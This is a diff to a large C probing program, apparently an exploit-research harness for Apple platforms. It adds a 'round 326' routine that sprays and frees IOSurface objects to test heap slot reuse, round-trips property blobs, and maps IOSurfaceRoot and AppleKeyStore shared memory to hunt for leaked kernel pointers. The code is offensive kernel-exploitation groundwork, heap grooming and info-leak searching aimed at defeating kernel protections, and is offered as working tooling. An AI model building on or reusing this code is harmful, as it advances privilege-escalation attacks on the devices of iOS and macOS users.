@@ -8330,6 +8330,314 @@ static void r325_probe(void) {
     fflush(stdout);
 }
 
+static void r326_probe(void) {
+    rlog("\n=== r326: Heap Shaping + IOSurface Object Correlation ===\n");
+    rlog("  Strategy: Shape kernel heap via IOSurface spray, correlate IDs with VM\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+    IOSurfaceGetBaseAddress_fn baFn = (IOSurfaceGetBaseAddress_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+    IOSurfaceGetAllocSize_fn asFn = (IOSurfaceGetAllocSize_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+    IOSurfaceLock_fn lkFn = (IOSurfaceLock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+    IOSurfaceUnlock_fn ulFn = (IOSurfaceUnlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+    IOSurfaceCreateMachPort_fn cpFn = (IOSurfaceCreateMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    IOSurfaceLookupFromMachPort_fn lpFn = (IOSurfaceLookupFromMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+
+    typedef void (*IOSurfaceSetValue_fn)(void*, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*IOSurfaceCopyValue_fn)(void*, CFStringRef);
+    IOSurfaceSetValue_fn setValFn = (IOSurfaceSetValue_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+    IOSurfaceCopyValue_fn getValFn = (IOSurfaceCopyValue_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+
+    if (!cFn || !idFn || !baFn || !lkFn || !ulFn || !asFn) {
+        rlog("  ERROR: Missing IOSurface symbols\n");
+        goto r326_done;
+    }
+
+    /* ---- Part 1: IOSurface spray — create many, track IDs and base addresses ---- */
+    rlog("--- Part 1: IOSurface spray + correlation ---\n");
+    fflush(stdout);
+    {
+        int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+        CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vs[] = {wV, hV, bV, pV};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        #define SPRAY_COUNT 32
+        void *surfaces[SPRAY_COUNT];
+        uint32_t ids[SPRAY_COUNT];
+        void *bases[SPRAY_COUNT];
+        size_t allocs[SPRAY_COUNT];
+        mach_port_t ports[SPRAY_COUNT];
+
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            surfaces[i] = cFn(props);
+            if (surfaces[i]) {
+                ids[i] = idFn(surfaces[i]);
+                allocs[i] = asFn(surfaces[i]);
+                lkFn(surfaces[i], 0, NULL);
+                bases[i] = baFn(surfaces[i]);
+                /* Write unique pattern */
+                uint64_t *p = (uint64_t *)bases[i];
+                for (int j = 0; j < 16; j++) p[j] = 0xAAAA000000000000ULL | (i << 16) | j;
+                ulFn(surfaces[i], 0, NULL);
+                ports[i] = cpFn ? cpFn(surfaces[i]) : 0;
+            }
+        }
+
+        rlog("  Sprayed %d surfaces:\n", SPRAY_COUNT);
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (surfaces[i]) {
+                rlog("    [%d] id=%u base=%p alloc=%zu port=0x%x\n",
+                     i, ids[i], bases[i], allocs[i], ports[i]);
+            }
+        }
+
+        /* Check if base addresses are contiguous */
+        int contiguous = 0;
+        for (int i = 1; i < SPRAY_COUNT; i++) {
+            if (surfaces[i] && surfaces[i-1]) {
+                ptrdiff_t delta = (uint8_t *)bases[i] - (uint8_t *)bases[i-1];
+                if (delta == (ptrdiff_t)allocs[i-1]) contiguous++;
+            }
+        }
+        rlog("  Contiguous pairs: %d/%d\n", contiguous, SPRAY_COUNT - 1);
+
+        /* Check ID sequentiality */
+        int sequential = 0;
+        for (int i = 1; i < SPRAY_COUNT; i++) {
+            if (ids[i] == ids[i-1] + 1) sequential++;
+        }
+        rlog("  Sequential IDs: %d/%d\n", sequential, SPRAY_COUNT - 1);
+
+        /* Now free every other surface and check if the holes get reused */
+        rlog("\n  Freeing odd surfaces...\n");
+        for (int i = 1; i < SPRAY_COUNT; i += 2) {
+            if (surfaces[i]) { CFRelease(surfaces[i]); surfaces[i] = NULL; }
+        }
+
+        /* Allocate new surfaces — do they land in the freed slots? */
+        void *new_surfaces[16];
+        for (int i = 0; i < 16; i++) {
+            new_surfaces[i] = cFn(props);
+            if (new_surfaces[i]) {
+                lkFn(new_surfaces[i], 0, NULL);
+                void *nb = baFn(new_surfaces[i]);
+                uint32_t nid = idFn(new_surfaces[i]);
+                ulFn(new_surfaces[i], 0, NULL);
+
+                /* Check if base matches any freed slot */
+                int matched = -1;
+                for (int j = 1; j < SPRAY_COUNT; j += 2) {
+                    if (nb == bases[j]) { matched = j; break; }
+                }
+                if (i < 8 || matched >= 0)
+                    rlog("    new[%d] id=%u base=%p %s\n", i, nid, nb,
+                         matched >= 0 ? "REUSED!" : "new");
+            }
+        }
+
+        /* Cleanup */
+        for (int i = 0; i < SPRAY_COUNT; i++)
+            if (surfaces[i]) CFRelease(surfaces[i]);
+        for (int i = 0; i < 16; i++)
+            if (new_surfaces[i]) CFRelease(new_surfaces[i]);
+
+        CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: IOSurface property mutation + cross-process check ---- */
+    rlog("\n--- Part 2: IOSurface SetValue/CopyValue kernel roundtrip ---\n");
+    fflush(stdout);
+    {
+        int w = 16, h = 16, bpe = 4, pf = 0x42475241;
+        CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vs[] = {wV, hV, bV, pV};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        void *surface = cFn(props);
+        if (surface && setValFn && getValFn) {
+            uint32_t sid = idFn(surface);
+            rlog("  Surface id=%u\n", sid);
+
+            /* Set a large data blob as a value — this goes through kernel IOKit */
+            uint8_t bigblob[4096];
+            for (int i = 0; i < 4096; i++) bigblob[i] = (uint8_t)(i & 0xFF);
+            CFDataRef data = CFDataCreate(NULL, bigblob, 4096);
+            setValFn(surface, CFSTR("TestBlob"), data);
+
+            /* Read it back */
+            CFTypeRef got = getValFn(surface, CFSTR("TestBlob"));
+            if (got && CFGetTypeID(got) == CFDataGetTypeID()) {
+                CFDataRef gotData = (CFDataRef)got;
+                rlog("  Set/Get 4096 blob: got %ld bytes\n", CFDataGetLength(gotData));
+
+                /* Scan the returned data for kernel pointers */
+                const uint8_t *bytes = CFDataGetBytePtr(gotData);
+                long len = CFDataGetLength(gotData);
+                int kptrs = 0;
+                for (long i = 0; i + 8 <= len; i += 8) {
+                    uint64_t val;
+                    memcpy(&val, bytes + i, 8);
+                    if ((val >> 28) == 0xfffffffULL && val != 0xffffffffffffffffULL) {
+                        rlog("    !!! KPTR at offset %ld: 0x%llx !!!\n", i, val);
+                        kptrs++;
+                    }
+                }
+                rlog("  Blob kptr scan: %d hits\n", kptrs);
+                CFRelease(got);
+            }
+            CFRelease(data);
+
+            /* Try setting and getting many different key names rapidly */
+            rlog("  Rapid key mutation:\n");
+            for (int i = 0; i < 20; i++) {
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "K%d", i);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+                int val = 0x41414141 + i;
+                CFNumberRef num = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                setValFn(surface, key, num);
+                CFRelease(key);
+                CFRelease(num);
+            }
+            /* Now read them back and check for corruption */
+            for (int i = 0; i < 20; i++) {
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "K%d", i);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+                CFTypeRef v = getValFn(surface, key);
+                if (v && CFGetTypeID(v) == CFNumberGetTypeID()) {
+                    int got_val = 0;
+                    CFNumberGetValue((CFNumberRef)v, kCFNumberIntType, &got_val);
+                    int expected = 0x41414141 + i;
+                    if (got_val != expected)
+                        rlog("    KEY CORRUPTION: K%d expected=0x%x got=0x%x\n", i, expected, got_val);
+                    CFRelease(v);
+                }
+                CFRelease(key);
+            }
+            rlog("  Key mutation check done (no corruption = no leak path)\n");
+
+            /* Try to send surface via mach port and read properties on the other side */
+            if (cpFn && lpFn) {
+                mach_port_t mp = cpFn(surface);
+                void *surface2 = lpFn(mp);
+                if (surface2) {
+                    uint32_t sid2 = idFn(surface2);
+                    rlog("  Port roundtrip: sent id=%u, got id=%u match=%d\n",
+                         sid, sid2, sid == sid2);
+                    /* Check if the lookup surface has same base address */
+                    lkFn(surface2, 0, NULL);
+                    void *ba2 = baFn(surface2);
+                    lkFn(surface, 0, NULL);
+                    void *ba1 = baFn(surface);
+                    rlog("  Base addresses: original=%p lookup=%p same=%d\n",
+                         ba1, ba2, ba1 == ba2);
+                    ulFn(surface, 0, NULL);
+                    ulFn(surface2, 0, NULL);
+                }
+            }
+
+            CFRelease(surface);
+        }
+        CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOConnectMapMemory — map IOKit shared memory ---- */
+    rlog("\n--- Part 3: IOConnectMapMemory probe ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (svc) {
+            io_connect_t conn = 0;
+            kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            if (kr == 0 && conn) {
+                /* Try to map shared memory from IOSurfaceRoot */
+                for (uint32_t memtype = 0; memtype < 10; memtype++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t size = 0;
+                    kr = IOConnectMapMemory64(conn, memtype, mach_task_self(),
+                        &addr, &size, kIOMapAnywhere);
+                    if (kr == 0) {
+                        rlog("  MapMemory type=%u: addr=0x%llx size=0x%llx\n",
+                             memtype, addr, size);
+                        /* Scan mapped memory for kernel pointers */
+                        uint64_t *p = (uint64_t *)(uintptr_t)addr;
+                        int kptrs = 0;
+                        for (size_t i = 0; i < size / 8 && i < 1024; i++) {
+                            if ((p[i] >> 28) == 0xfffffffULL &&
+                                p[i] != 0xffffffffffffffffULL) {
+                                rlog("    !!! KPTR at +0x%zx: 0x%llx !!!\n", i * 8, p[i]);
+                                kptrs++;
+                                if (kptrs >= 10) break;
+                            }
+                        }
+                        rlog("    Scanned %zu qwords, %d kptrs\n",
+                             size / 8 < 1024 ? size / 8 : 1024, kptrs);
+                        IOConnectUnmapMemory64(conn, memtype, mach_task_self(), addr);
+                    } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                        rlog("  MapMemory type=%u: kr=0x%x\n", memtype, kr);
+                    }
+                }
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+
+        /* Also try AppleKeyStore MapMemory */
+        io_service_t aks = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        if (aks) {
+            io_connect_t conn = 0;
+            kr = IOServiceOpen(aks, mach_task_self(), 0, &conn);
+            if (kr == 0 && conn) {
+                for (uint32_t memtype = 0; memtype < 5; memtype++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t size = 0;
+                    kr = IOConnectMapMemory64(conn, memtype, mach_task_self(),
+                        &addr, &size, kIOMapAnywhere);
+                    if (kr == 0) {
+                        rlog("  AKS MapMemory type=%u: addr=0x%llx size=0x%llx\n",
+                             memtype, addr, size);
+                        uint64_t *p = (uint64_t *)(uintptr_t)addr;
+                        for (size_t i = 0; i < size / 8 && i < 512; i++) {
+                            if ((p[i] >> 28) == 0xfffffffULL &&
+                                p[i] != 0xffffffffffffffffULL) {
+                                rlog("    !!! AKS KPTR at +0x%zx: 0x%llx !!!\n", i * 8, p[i]);
+                            }
+                        }
+                        IOConnectUnmapMemory64(conn, memtype, mach_task_self(), addr);
+                    }
+                }
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(aks);
+        }
+    }
+    fflush(stdout);
+
+r326_done:
+    rlog("\n=== r326 complete ===\n");
+    fflush(stdout);
+}
+
 static void r317_probe(void) {
     rlog("\n=== r317: Deep AppleKeyStore + AppleJPEGDriver + CredentialManager ===\n\n");
     fflush(stdout);
@@ -39142,6 +39450,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 326) {
+            rlog("*** rounds=326: Heap Shaping + IOSurface Correlation + MapMemory ***\n");
+            rlog("  r325: 0/100 IOKit services openable, 190 VM regions no kptrs.\n");
+            rlog("  Probe: IOSurface spray, SetValue blob, IOConnectMapMemory.\n\n");
+            r326_probe();
             goto done;
         }
         if (rounds == 325) {
